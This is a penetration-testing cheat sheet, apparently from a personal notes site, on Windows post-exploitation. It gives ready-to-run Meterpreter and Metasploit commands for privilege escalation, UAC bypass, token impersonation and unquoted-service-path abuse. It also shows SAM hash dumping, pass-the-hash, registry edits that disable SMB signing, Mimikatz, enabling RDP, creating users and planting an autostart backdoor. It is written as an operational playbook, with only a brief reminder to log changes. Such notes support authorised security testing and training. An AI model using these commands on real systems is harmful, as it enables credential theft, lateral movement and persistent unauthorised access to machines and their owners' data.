## General Information

During the post-exploitation phase, it might be necessary/desired to modify in some way the machines
you gained access to. Remember that these changes should be logged, and that backups of whatever is
changed should be taken and stored safely.

## Privilege Escalation and Persistence

The first step after compromising a system is to escalate the privileges and to maintain
persistence, ensuring that we can get access to the same system at a different point in time.

There are mainly two different privilege escalation strategies: Horizontal and Vertical.

**Horizontal** escalation means gaining same-level access to a different machine.
**Vertical** escalation means gaining SYSTEM/root level access to a machine.


### Privilege Escalation

#### Windows


#### Basic Meterpreter
 
```
getsystem
```

It might not work in case UAC is enabled. To verify that, use

```
post/windows/gather/win_privs
```

In case UAC is enabled, it is possible to use

```
exploit/windows/local/bypassuac_vbs
```

#### Incognito

Another strategy is to use a module called
[Incognito](https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/),
that can be loaded directly from Meterpreter. This tool allows to dump users' tokens, add new users
to groups etc.

```
use incognito
list_tokens -u
```

At this point we can try impersonating some other user, and we can access different resources both
locally and within the domain.

#### Unquoted Paths

Unquoted paths can be used to maintain persistence. If a Windows service is configured to run an
executable whose path is both unquoted and contains spaces, Windows will search for .exe files in every
path after a space, until it finds one.

```
wmic service get name,displayname,pathname,startmode|findstr/i"auto" |findstr/i/v "c:\windows\\" |findstr/i/v """
```

If we have write access to any of the subpaths that Windows will look for, then we can drop a binary
that will be executed every time the original service is run.
This can both ensure persistence and, in case the service runs with higher privileges, allow for
privilege escalation.

Metasploit also contains a module to do this:

```
exploit/windows/local/trusted_service_path
```

#### Writeable Paths

Whenever there is a high-privilege process that is started using a binary in a directory where we do
have write access, we can use that process to escalate the privileges.


### Persistence

There are several techniques to maintain access to systems, which depend heavily on the OS. Many
techniques to achieve persistence need privileged access.
A rough idea of the techniques is the following:

* Getting a password Hash and use services that allow remote access (RDP, VNC, SSH, etc.) by
    * Pass-the-hash
    * Crack it
* Create a Backdoor
* Create a new user that can access services such as RDP, SSH, etc.

#### Meterpreter Migrate

If the access is through a meterpreter session, one of the first things to do is to run 

```
migrate -P [PID]
run post/windows/manage/migrate
```

This will attach the meterpreter session to a different process. This technique will only ensure
that the session won't be dropped if the exploited application will be closed (for example a browser
session), and for this, it doesn't require high privileges.

#### Getting Hashes

On Windows, the most straightforward way to dump the SAM database, that contains users' hashes is to
run

```
hashdump
```

within a Meterpreter session (requires SYSTEM access).


#### Pass-the-Hash

In order to use the obtained hashes to access other systems, we can use pass-the-hash, which is
implemented in:

```
exploit/windows/smb/psexec
set SMBPass [HASH]
```

In some cases, this technique might fail and some changes are necessary on the target machine to
have this technique to work. Namely, two registries might need to be modified:

```
# Allow users in the local-administrator group to pass-the-hash
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# Add a new DWORD (32-bit) named LocalAccountTokenFilterPolicy and set its value to 1
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
# Add a new DWORD (32-bit) named RequireSecuritySignature and set its value to 0
```

To do this in PowerShell, we can use:

```
Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
Set-ItemProperty -Path
HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters –Name RequireSecuritySignature –Value 0 –Type DWord
```

or we can do it manually via the `reg` command:

```
reg add “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add “HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” /v RequireSecuritySignature /t REG_DWORD /d 0 /f
```

More info available
[here](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/).

#### Pass-the-Hash over RDP

If we have a NTLM hash and RDP is available, we can use clients such as `xfreerdp`:

```
xfreerdp /u:[USER] /d:[DOMAIN] /pth:[HASH] /v:[IP]
```

#### Mimikatz

!!! note
    Mimikatz needs to be running in a 64-bit process. Use `sysinfo` in meterpreter to check this

Mimikatz is a tool that can extract passwords (and much more) from memory.

```
load mimikatz
```

It has then several commands such as `kerberos`, `wdigest` `ssp` etc.

#### RDP

RDP is the prime service to access remotely to maintain access.

To verify whether RDP is enabled:

```
net start
wmic service where 'Caption like "Remote%" and started=true' get Caption
```

If the service is not enabled, from meterpreter we have script that automates the whole flow:

```
run getgui -e [-u [USER] -p [PASS]]
```

it can also add a new user for RDP in addition to enable the service (`-e`).
In order to grant a user access to RDP, this needs to be in the `Remote Desktop Users` group.

To add a user to the group, we can run 

```
# List users in the group
net localgroup "Remote Desktop Users"
net localgroup "Remote Desktop Users" [USER] /add
```

Now we can try logging in with

```
rdesktop [IP] -u [USER] -p [PASS]
```

#### Backdooring

Creating a backdoor means that we manage to upload a binary that will try to connect back to use
every few seconds, everytime the machine is on.

Metasploit already implements all this with the `run persistence` script.

The steps can also be done manually:

* Generate a payload with `msfvenom`
* Upload the backdoor
* Run the backdoor
* Add the backdoor to registry for autostart
  `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\backdoor.exe`

To run the last step manually, we can use

```
reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –d [value_of_the key] –v [name_of_the_key]
```

#### Add a New User

In order to create a new user we can use

```
net user [USER] [PASS] /add
net localgroup [GROUP] [USER] /add
```


